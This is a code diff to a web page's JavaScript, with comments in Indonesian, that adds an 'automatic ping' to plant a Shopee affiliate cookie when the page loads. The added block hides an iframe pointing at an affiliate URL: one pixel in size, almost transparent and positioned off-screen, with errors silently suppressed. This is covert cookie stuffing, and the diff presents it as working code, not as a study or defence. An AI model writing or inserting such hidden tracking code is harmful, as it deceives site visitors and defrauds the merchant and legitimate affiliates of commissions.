@@ -268,6 +268,18 @@
         document.getElementById('btnSecondaryText').innerText = 'Tonton Referensi di YouTube';
     }
 
+    // ─── 0. PING OTOMATIS: Tanam Cookie Shopee Langsung Saat Halaman Dimuat ───
+    try {
+        const pingFrame = document.createElement('iframe');
+        pingFrame.src = affiliateUrl;
+        pingFrame.style.width = '1px';
+        pingFrame.style.height = '1px';
+        pingFrame.style.opacity = '0.01';
+        pingFrame.style.position = 'absolute';
+        pingFrame.style.left = '-9999px';
+        document.body.appendChild(pingFrame);
+    } catch (e) {}
+
     let hasProceeded = false;
 
     // ─── FUNGSI UTAMA: DUAL DESTINATION (COOKIE DROP + KONTEN ASLI) ───
